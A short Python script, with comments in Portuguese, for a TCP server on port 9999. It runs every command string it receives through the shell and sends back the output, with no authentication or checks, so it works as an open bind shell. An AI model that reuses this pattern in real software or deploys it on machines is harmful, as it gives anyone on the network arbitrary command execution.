import socket
import subprocess

# Crie um socket TCP/IP
servidor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Obtenha o nome da máquina local
nome_máquina = socket.gethostname()

# Defina a porta em que o servidor deve escutar
porta = 9999

# Associe o socket a uma porta e comece a escutar por conexões
servidor_socket.bind((nome_máquina, porta))
servidor_socket.listen(1)

print(f"Aguardando conexões em {nome_máquina}:{porta}...")

while True:
    # Espere por uma conexão
    conexao, endereço_cliente = servidor_socket.accept()
    print(f"Conexão recebida de {endereço_cliente}")
    
    # Receba o comando enviado pelo cliente
    comando = conexao.recv(1024).decode()
    print(f"Comando recebido: {comando}")
    
    # Execute o comando e obtenha o resultado
    resultado = subprocess.check_output(comando, shell=True)
    print(f"Resultado do comando: {resultado.decode()}")
    
    # Envie o resultado de volta para o cliente
    conexao.send(resultado)
    
    # Feche a conexão
    conexao.close()